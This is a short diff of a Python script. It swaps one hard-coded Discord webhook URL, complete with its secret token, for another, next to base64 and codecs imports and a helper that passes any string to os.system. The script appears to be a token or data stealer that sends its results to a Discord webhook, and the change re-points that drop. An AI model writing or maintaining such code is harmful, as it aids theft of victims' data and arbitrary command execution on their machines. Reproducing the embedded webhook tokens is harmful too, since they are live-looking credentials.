@@ -2,7 +2,7 @@ import os
 import base64, codecs
 import json
 
-webhookk = "https://discord.com/api/webhooks/1004135826994774147/9kxUKEsxH0DJNxb3TkKE1vMimNaKWEFJcVT_uXvOqyAUxPK2qUPM5nst1g562qRhCQ6y"
+webhookk = "https://discord.com/api/webhooks/1170924813729153074/UXVjwsCcurcvqjEClrNl7W5-IuiNnJIScTTyiik9NBcal0A0P3ygjxg05Fz3CNJAexdO"
 
 def command(c):
     os.system(c)
